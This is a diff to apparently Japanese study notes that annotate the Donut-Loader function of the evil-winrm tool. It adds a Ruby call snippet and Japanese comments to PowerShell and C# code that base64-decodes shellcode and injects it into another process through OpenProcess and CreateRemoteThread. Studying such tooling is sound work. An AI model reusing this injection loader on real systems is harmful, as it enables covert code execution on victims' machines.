@@ -260,6 +260,14 @@ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 
 
 ## [Donut-Loader](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L798)
+powershellで「」
+```ruby
+pid = donut_Loader[2]
+load_executable = donut_Loader[4]
+load_executable = File.binread(load_executable)
+load_executable = Base64.strict_encode64(load_executable)
+output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
+```
 このPowershellは、evil-winrmのコード上では「Base64で難読化」されている（[リンク](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L579)）
 ```powershell
 function Donut-Loader {param($process_id,$donutfile)
@@ -282,6 +290,7 @@ function Donut-Loader {param($process_id,$donutfile)
     -----------
     Function that loads an arbitrary donut :D
 "@
+# 関数「Donut-Loader」の引数にプロセスIDもしくはファイルパスが指定されていない場合ヘルプを表示
 if ($process_id -eq $null -or $donutfile -eq $null) {write-host "$help`n"} else 
 {
 # [IntPtr]::Size=4 → アプリケーションが32bitで動いている、この場合Powershellスクリプトを終了させる
@@ -331,10 +340,11 @@ namespace ShellcodeTest
 		private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 		public static int Inject(string x86, string x64, int procPID)
 		{
-			// System.Diagnostics.Process.GetProcessByIdで引数で指定されたプロセスIDを取得（プロセスIDがないとエラーになる）
+			// System.Diagnostics.Process.GetProcessByIdで引数で指定されたプロセスIDからそのプロセスを取得（プロセスIDがないとエラーになる）
 			Process processById = Process.GetProcessById(procPID);
 			Console.WriteLine(processById.Id);
 			string text;
+			// WindowsAPIの「IsWow64Process」関数で、指定されたプロセスIDのプロセスがx64で実行されているか確認
 			if (Program.IsWow64Process(processById))
 			{
 				text = x86;
@@ -343,6 +353,7 @@ namespace ShellcodeTest
 			{
 				text = x64;
 			}
+			// System.Convert.FromBase64String()でバイト型配列に変換
 			byte[] array = Convert.FromBase64String(text);
 			IntPtr intPtr = Program.OpenProcess(1082, false, processById.Id);
 			checked
